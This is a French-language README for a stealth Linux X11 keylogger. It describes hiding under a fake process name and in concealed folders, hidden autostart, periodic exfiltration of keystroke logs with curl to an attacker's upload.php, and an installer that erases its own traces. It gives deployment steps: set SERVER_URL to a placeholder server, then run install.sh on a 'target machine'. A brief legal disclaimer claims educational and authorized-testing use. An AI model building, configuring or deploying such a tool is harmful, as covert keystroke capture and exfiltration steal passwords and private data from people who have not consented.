# Stealth X11 Keylogger (No-Sudo)

Un keylogger discret pour Linux fonctionnant dans l'espace utilisateur (X11), capable d'envoyer les captures vers un serveur distant sans nécessiter de privilèges `root`.

## 🚀 Fonctionnalités

*   **Zéro Sudo** : Fonctionne entièrement avec les permissions de l'utilisateur courant (via l'API X11).
*   **Mode Furtif** : 
    *   Renommage automatique du processus en `dbus-service` dans le gestionnaire de tâches.
    *   Installation dans un dossier système caché (`~/.local/share/.sys-updates`).
    *   Fichier de log masqué (`.sys_cache`).
*   **Auto-Exécution** : Se lance automatiquement à l'ouverture de la session utilisateur via un fichier `.desktop` masqué.
*   **Exfiltration Réseau** : Envoi périodique (toutes les 10 minutes) du fichier de log vers un serveur distant via `curl`.
*   **Auto-Nettoyage** : Le script d'installation supprime les sources (`.c`) et lui-même après la compilation pour ne laisser aucune trace.

## 🛠️ Installation

### 1. Configuration du Serveur
Assurez-vous d'avoir un serveur Web avec PHP. Placez le fichier `upload.php` fourni à la racine de votre serveur.

### 2. Configuration du Client
Ouvrez `keylogger_x11.c` et modifiez la ligne suivante avec l'URL de votre serveur :
```c
#define SERVER_URL "http://votre-serveur.com/upload.php"
```

### 3. Déploiement
Copiez le dossier sur la machine cible et lancez simplement :
```bash
./install.sh
```
*Le script va compiler le binaire, le cacher, configurer l'auto-démarrage, le lancer, puis supprimer le dossier d'installation.*

## 📂 Structure du Projet

*   `keylogger_x11.c` : Code source principal (capture X11 + exfiltration).
*   `install.sh` : Script d'installation automatisé et discret.
*   `uninstall.sh` : Script pour arrêter le service et supprimer tous les fichiers cachés.
*   `upload.php` : Script côté serveur pour recevoir les logs silencieusement.

## 🧹 Désinstallation
Pour arrêter le keylogger et supprimer toutes les traces du système :
```bash
./uninstall.sh
```

## ⚠️ Avertissement Légal
Ce logiciel est conçu à des fins éducatives et de test de pénétration autorisé uniquement. L'utilisation de cet outil pour surveiller des personnes sans leur consentement explicite est illégale et punissable par la loi. L'auteur décline toute responsabilité en cas d'utilisation abusive.
